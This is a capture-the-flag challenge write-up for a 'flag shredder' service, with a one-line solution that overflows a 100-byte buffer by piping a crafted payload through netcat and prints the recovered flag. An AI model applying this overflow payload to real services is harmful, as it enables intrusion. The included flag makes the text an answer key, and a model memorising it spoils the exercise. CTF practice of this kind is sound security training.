# flag shredder

I made this new data shredding service!  I'll dispose of any bits you send me, straight into /dev/null. I'm so confident you can't exploit it that I'm disposing one of my old flags with every connection!

`nc ctfworkshop.cybr.club 3003`

(provide output of make dist, flag_shredder.zip)

## Solution
```
$ python3 -c 'import struct; import sys; sys.stdout.buffer.write(b"A"*100+struct.pack("<L", 1)+b"\n")' | nc 172.17.0.2 3003
Reading data for disposal:
gigem{53cur3_d3vnull_53rv1c3}
```
